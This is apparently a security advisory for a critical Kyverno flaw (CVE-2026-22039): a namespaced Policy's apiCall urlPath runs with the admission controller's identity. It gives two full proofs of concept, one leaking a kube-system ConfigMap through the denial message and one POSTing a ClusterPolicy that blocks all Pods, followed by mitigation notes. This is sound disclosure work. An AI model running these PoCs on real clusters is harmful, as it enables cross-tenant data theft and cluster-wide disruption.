# Kyverno Cross-Namespace Privilege Escalation via Policy apiCall

**GHSA**: GHSA-8p9x-46gm-qfx2 | **CVE**: CVE-2026-22039 | **Severity**: critical (CVSS 10.0)

**CWE**: CWE-269, CWE-918

**Affected Packages**:
- **github.com/kyverno/kyverno** (go): < 1.15.3
- **github.com/kyverno/kyverno** (go): >= 1.16.0-rc.1, < 1.16.3

## Description

### Summary

A critical authorization boundary bypass in namespaced Kyverno Policy [apiCall](https://kyverno.io/docs/policy-types/cluster-policy/external-data-sources/#url-paths). The resolved `urlPath` is executed using the Kyverno admission controller ServiceAccount, with no enforcement that the request is limited to the policy’s namespace.

As a result, any authenticated user with permission to create a namespaced Policy can cause Kyverno to perform Kubernetes API requests using Kyverno’s admission controller identity, targeting any API path allowed by that ServiceAccount’s RBAC. This breaks namespace isolation by enabling cross-namespace reads (for example, ConfigMaps and, where permitted, Secrets) and allows cluster-scoped or cross-namespace writes (for example, creating ClusterPolicies) by controlling the urlPath through context variable substitution.

### Details

The vulnerability exists in how Kyverno handles `apiCall` context entries. The code substitutes variables into the `URLPath` field without sanitizing the output or validating that the resulting path is authorized for the scope of the policy.

1.  In `pkg/engine/apicall/apiCall.go`, the `Fetch` method performs variable substitution on the entire `APICall` object, including the `URLPath`.
    ```go
    // pkg/engine/apicall/apiCall.go
    func (a *apiCall) Fetch(ctx context.Context) ([]byte, error) {
        // Variable substitution happens here
        call, err := variables.SubstituteAllInType(a.logger, a.jsonCtx, a.entry.APICall)
        // ...
        data, err := a.Execute(ctx, &call.APICall)
    ```

2.  In `pkg/engine/apicall/executor.go`, the `Execute` method delegates to `executeK8sAPICall`, which passes the raw path directly to the Kubernetes client's `RawAbsPath` method.
    ```go
    // pkg/engine/apicall/executor.go
    func (a *executor) executeK8sAPICall(ctx context.Context, path string, method kyvernov1.Method, ...) ([]byte, error) {
        // ...
        // Path is used directly in the raw API call
        jsonData, err := a.client.RawAbsPath(ctx, path, string(method), requestData)
    ```

Because `RawAbsPath` executes a direct HTTP request to the API server using Kyverno's admission controller service account (which typically has broad permissions), an attacker can construct any valid API path to access and mutate resources they shouldn't have access to.

### PoC 001 - Data exfiltration
The following steps demonstrate how a user restricted to the `default` namespace (with no access to `kube-system`) can read a sensitive ConfigMap from the `kube-system` namespace.

**0. Setup kind + Kyverno**

Tested with Kyverno v1.16.1 on k8s v1.34.0.

```bash
kind create cluster
helm repo add kyverno https://kyverno.github.io/kyverno/
helm repo update
helm install kyverno kyverno/kyverno -n kyverno --create-namespace
```

**1. Setup target and low-privileged user**
Create a confidential resource in a privileged namespace, and create a restricted user `policy-admin` who only has permissions to manage policies in the `default` namespace.
```bash
# Create confidential data in kube-system
kubectl create configmap target-cm -n kube-system --from-literal=key=confidential-data

# Create a restricted service account
kubectl create sa policy-admin -n default

# Create a role for managing policies and configmaps in default namespace only
kubectl create role policy-admin-role -n default \
  --verb=create,get,list,update,delete \
  --resource=policies.kyverno.io,configmaps

# Bind the role to the service account
kubectl create rolebinding policy-admin-binding -n default \
  --role=policy-admin-role \
  --serviceaccount=default:policy-admin

# Verify the user cannot access kube-system
kubectl auth can-i get configmaps -n kube-system --as=system:serviceaccount:default:policy-admin
# Output: no
```

**2. Create malicious policy as the restricted user**
Impersonating the restricted user `policy-admin`, apply a namespaced `Policy` in the `default` namespace.
```yaml
cat <<EOF | kubectl apply --as=system:serviceaccount:default:policy-admin -f -
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: cross-ns-leak
  namespace: default
spec:
  validationFailureAction: Enforce
  rules:
  - name: leak-config
    match:
      resources:
        kinds:
        - ConfigMap
    context:
    - name: leakedData
      apiCall:
        # Injection happens here via annotations
        urlPath: "/api/v1/namespaces/{{request.object.metadata.annotations.target_ns}}/configmaps/{{request.object.metadata.annotations.target_name}}"
        jmesPath: "data.key"
    validate:
      # The leaked data is returned in the denial message
      message: "LEAKED DATA: {{leakedData}}"
      deny: {}
EOF
```

**3. Trigger the leak**
As the restricted user, create a ConfigMap in the `default` namespace with annotations pointing to the target resource in `kube-system`.
```yaml
cat <<EOF | kubectl apply --as=system:serviceaccount:default:policy-admin -f -
apiVersion: v1
kind: ConfigMap
metadata:
  name: trigger-leak
  namespace: default
  annotations:
    target_ns: "kube-system"
    target_name: "target-cm"
data: {}
EOF
```

**4. Result**
The creation request is denied, but the error message contains the secret data from `kube-system`, proving the privilege escalation.

```
Error from server: error when creating "STDIN": admission webhook "validate.kyverno.svc-fail" denied the request: 

resource ConfigMap/default/trigger-leak was blocked due to the following policies 

cross-ns-leak:
  leak-config: 'LEAKED DATA: confidential-data'
```

### PoC 002 - ClusterPolicy injection

Continue from the setup from the previous PoC.

This vulnerability also allows creation of cluster-level resources. For example, a low-privileged user can create a `ClusterPolicy` that impacts the entire cluster. In this PoC, a low-privileged user creates a cluster policy, which prevents scheduling of pods.

**1. Apply a malicious policy**

```yaml
cat <<EOF | kubectl apply --as=system:serviceaccount:default:policy-admin -f -
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: mutation-cpol
  namespace: default
spec:
  validationFailureAction: Enforce
  rules:
  - name: create-malicious-cpol
    match:
      resources:
        kinds:
        - ConfigMap
    context:
    - name: mutation
      apiCall:
        urlPath: "/apis/kyverno.io/v1/clusterpolicies"
        method: POST
        data:
        - key: apiVersion
          value: "kyverno.io/v1"
        - key: kind
          value: "ClusterPolicy"
        - key: metadata
          value:
            name: "malicious-cpol"
        - key: spec
          value:
            validationFailureAction: Enforce
            rules:
            - name: block-all
              match:
                resources:
                  kinds:
                  - Pod
              validate:
                message: "Blocked by malicious policy"
                deny: {}
    validate:
      message: "Created ClusterPolicy: {{mutation.metadata.name}}"
      deny: {}
EOF
```

**2. Trigger the policy**

```bash
cat <<EOF | kubectl apply --as=system:serviceaccount:default:policy-admin -f -
apiVersion: v1
kind: ConfigMap
metadata:
  name: trigger-cpol
  namespace: default
data: {}
EOF
```

This outputs an error:

```
Error from server: error when creating "STDIN": admission webhook "validate.kyverno.svc-fail" denied the request:

resource ConfigMap/default/trigger-cpol was blocked due to the following policies

mutation-cpol:
  create-malicious-cpol: ""
```

**3. Observe the new cluster policy**

```bash
kubectl get clusterpolicy malicious-cpol
```

Outputs:

```
NAME             ADMISSION   BACKGROUND   READY   AGE     MESSAGE
malicious-cpol   true        true         True    4m58s   Ready
```

**4. Verify that no new pods can be created (even as a cluster admin)**

Run:

```
kubectl run --image=nginx foo
```

Outputs:

```
Error from server: admission webhook "validate.kyverno.svc-fail" denied the request:

resource Pod/default/foo was blocked due to the following policies

malicious-cpol:
  block-all: Blocked by malicious policy
```
### Impact

- Users with `Policy` creation rights in a single namespace can escalate privileges (context of Kyverno admission controller).
- Since `apiCall` supports `POST`, attackers can potentially create resources in privileged namespaces (e.g., creating a RoleBinding in `kube-system` to grant themselves cluster-admin) if the Kyverno service account has write permissions.
- Attackers can disrupt the entire cluster by creating a malicious `ClusterPolicy` that blocks critical operations (e.g., preventing Pod scheduling), as demonstrated in PoC #2.
- Sensitive data (Secrets, tokens, configuration) can be exfiltrated from any namespace, depending on the RBAC.
- In shared clusters, one tenant can read data belonging to other tenants or the cluster administration.

The following command should be run on a per-environment basis to understand impact:

```
kubectl auth can-i --as=system:serviceaccount:kyverno:kyverno-admission-controller --list
```

By default, this does not include Secrets. 


### Mitigation

The `apiCall` logic should enforce that `Policy` resources (namespaced policies) can only access resources within the same namespace. If a `Policy` attempts to access a resource in a different namespace via `urlPath`, the request should be blocked. `ClusterPolicy` resources are unaffected by this restriction as they are intended to operate cluster-wide.

The mitigation logic validates the `urlPath` for namespaced policies by ensuring:
1. The path explicitly contains the `/namespaces/<namespace>/` segment.
2. The namespace in the path matches the policy's namespace.
3. Requests missing the namespace segment (targeting cluster-scoped resources) or targeting a different namespace are rejected.

This effectively prevents both the cross-namespace data leak and the creation of cluster-scoped resources (like `ClusterPolicy`) or resources in other namespaces via the `POST` method.
